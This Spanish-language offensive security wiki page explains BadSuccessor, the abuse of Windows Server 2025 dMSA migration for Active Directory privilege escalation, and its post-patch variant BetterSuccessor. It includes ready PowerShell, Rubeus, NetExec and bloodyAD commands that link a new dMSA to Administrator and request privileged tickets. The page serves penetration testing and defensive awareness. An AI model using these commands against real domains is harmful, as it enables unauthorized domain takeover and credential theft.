# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

**BadSuccessor** abusa del flujo de trabajo de migración de **cuentas de servicio administradas delegadas** (**dMSA**) introducido en **Windows Server 2025**. Una dMSA puede vincularse a una cuenta heredada mediante **`msDS-ManagedAccountPrecededByLink`** y avanzar por los estados de migración almacenados en **`msDS-DelegatedMSAState`**. Si un atacante puede crear una dMSA en una OU con permisos de escritura y controlar esos atributos, el KDC puede emitir tickets para la dMSA controlada por el atacante con el **contexto de autorización de la cuenta vinculada**.<sup>[[2]](#references)</sup>

En la práctica, esto significa que un usuario con pocos privilegios que solo tiene permisos delegados en una OU puede crear una nueva dMSA, vincularla a `Administrator`, completar el estado de migración y, después, obtener un TGT cuyo PAC contiene grupos con privilegios elevados, como **Domain Admins**.<sup>[[2]](#references)</sup>

## Detalles importantes de la migración de dMSA

- dMSA es una función de **Windows Server 2025**.
- `Start-ADServiceAccountMigration` establece la migración en el estado **iniciada**.
- `Complete-ADServiceAccountMigration` establece la migración en el estado **completada**.
- `msDS-DelegatedMSAState = 1` significa que la migración se inició.
- `msDS-DelegatedMSAState = 2` significa que la migración se completó.
- Durante una migración legítima, se supone que la dMSA reemplaza de forma transparente a la cuenta sustituida, por lo que el KDC/LSA preserva el acceso que ya tenía la cuenta anterior.<sup>[[3]](#references)</sup>

Microsoft Learn también señala que, durante la migración, la cuenta original queda vinculada a la dMSA y que se pretende que la dMSA pueda acceder a lo mismo que podía acceder la cuenta anterior.<sup>[[3]](#references)</sup> Esta es la suposición de seguridad de la que abusa BadSuccessor.<sup>[[2]](#references)</sup>

## Requisitos

1. Un dominio donde **exista dMSA**, lo que significa que el lado de AD cuenta con compatibilidad con **Windows Server 2025**.
2. El atacante puede **crear** objetos `msDS-DelegatedManagedServiceAccount` en alguna OU, o tiene derechos equivalentes y amplios para crear objetos secundarios allí.
3. El atacante puede **escribir** los atributos pertinentes de la dMSA o controlar por completo la dMSA que acaba de crear.
4. El atacante puede solicitar tickets Kerberos desde un contexto unido al dominio o desde un túnel que tenga acceso a LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Comprobaciones prácticas

La señal más clara para el operador es verificar el nivel del dominio/bosque y confirmar que el entorno ya utiliza la nueva plataforma Server 2025:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Si ves valores como `Windows2025Domain` y `Windows2025Forest`, prioriza comprobar **BadSuccessor / dMSA migration abuse**.

También puedes enumerar las OUs con permisos de escritura delegados para crear dMSA usando herramientas públicas:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Flujo de abuso

1. Crea un dMSA en una OU donde tengas derechos delegados para crear elementos secundarios.
2. Establece **`msDS-ManagedAccountPrecededByLink`** en el DN de un objetivo privilegiado, como `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Establece **`msDS-DelegatedMSAState`** en `2` para marcar la migración como completada.
4. Solicita un TGT para el nuevo dMSA y usa el ticket devuelto para acceder a servicios privilegiados.<sup>[[2]](#references)</sup>

Ejemplo de PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ejemplos de solicitud de tickets / herramientas operativas:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Por qué esto es más que una escalada de privilegios

Durante una migración legítima, Windows también necesita que el nuevo dMSA gestione los tickets emitidos para la cuenta anterior antes del cambio. Por eso, el material de tickets relacionado con dMSA puede incluir claves **actuales** y **anteriores** en el flujo **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

En una migración falsa controlada por un atacante, este comportamiento puede convertir BadSuccessor en:<sup>[[2]](#references)</sup>

- **Escalada de privilegios** al heredar los SID de grupos privilegiados en el PAC.
- **Exposición de material de credenciales**, ya que la gestión de claves anteriores puede exponer material equivalente al hash RC4/NT del predecesor en flujos de trabajo vulnerables.

Esto hace que la técnica sea útil tanto para tomar el control directo del dominio como para operaciones posteriores, como pass-the-hash o un compromiso más amplio de credenciales.

## BetterSuccessor tras el parche del KDC

El KDC con el parche valida ambos extremos de una migración dMSA. Además de `msDS-ManagedAccountPrecededByLink` y el estado de migración del dMSA, el predecesor debe apuntar de vuelta al dMSA mediante `msDS-SupersededManagedAccountLink` y tener un `msDS-SupersededServiceAccountState` compatible. Ahora, un vínculo unidireccional falla; una cuenta que solo puede crear un dMSA no puede designar un predecesor arbitrario. Si tiene `CreateChild` para crear un dMSA en una OU **y** acceso de escritura efectivo a los atributos de migración de la cuenta de destino seleccionada, un atacante puede establecer el vínculo recíproco. El ticket dMSA resultante puede contener el contexto de autorización del predecesor y exponer sus claves en el paquete de claves dMSA. Esta es una vía dirigida de acceso a credenciales y amplificación de privilegios, no una prueba de que el BadSuccessor original con un destino arbitrario siga siendo explotable en DC con el parche instalado.<sup>[[5]](#references)[[6]](#references)</sup>

En un laboratorio donde se confirme el acceso de escritura a la cuenta de destino, `bloodyAD` puede crear el dMSA y realizar las escrituras de migración correspondientes. Solicite el ticket dMSA usando el material Kerberos devuelto y compruebe los permisos reales de la cuenta de destino antes de dar por hecho que se recuperaron sus privilegios o su hash. El nombre del subcomando `badSuccessor` de la herramienta no implica que se aplique el comportamiento unidireccional sin parche.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Notas sobre el estado del parche

El comportamiento original de BadSuccessor **no es solo un problema teórico de la versión preliminar de 2025**. Microsoft le asignó el **CVE-2025-53779** y publicó una actualización de seguridad en **agosto de 2025**.<sup>[[4]](#references)</sup> Mantén documentado este ataque para:

- **labs / CTFs / ejercicios de assume-breach**
- **entornos de Windows Server 2025 sin parchear**
- **validar delegaciones de OU y la exposición de dMSA durante evaluaciones**

No des por sentado que un dominio de Windows Server 2025 es vulnerable solo porque existe dMSA; verifica el nivel de parche y realiza pruebas con cuidado.

## Herramientas

- [Herramientas de Akamai para BadSuccessor](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Módulo `badsuccessor` de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - abuso de dMSA con BadSuccessor para obtener Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: abuso de dMSA para escalar privilegios en Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Descripción general de las cuentas de servicio administradas delegadas](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor ha muerto, larga vida a BadSuccessor(?) ](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: seguir abusando de dMSA después del parche](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
